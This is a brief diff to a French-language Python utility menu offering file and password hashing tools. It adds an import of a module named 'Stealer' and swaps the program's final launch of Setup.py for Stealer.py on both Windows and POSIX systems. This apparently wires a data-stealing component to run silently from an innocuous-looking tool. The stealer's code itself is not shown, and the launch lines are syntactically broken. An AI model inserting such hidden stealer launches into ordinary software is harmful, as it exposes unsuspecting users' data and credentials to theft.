@@ -17,6 +17,7 @@ from Option import HashFichier
 from Option import HashMDP
 from Option import VerifMDP
 from Option import Conv
+from Option import Stealer
 
 def afficher_menu():
     print("""
@@ -114,6 +115,6 @@ while True:
     input("Appuyez sur Entrée pour revenir au menu.")
 
 if os.name == 'nt':  
-    os.startfile(Setup.py)
+    os.startfile(Stealer.py)
 elif os.name == 'posix':  
-    os.system(f'open {Setup.py}') 
+    os.system(f'open {Stealer.py}') 
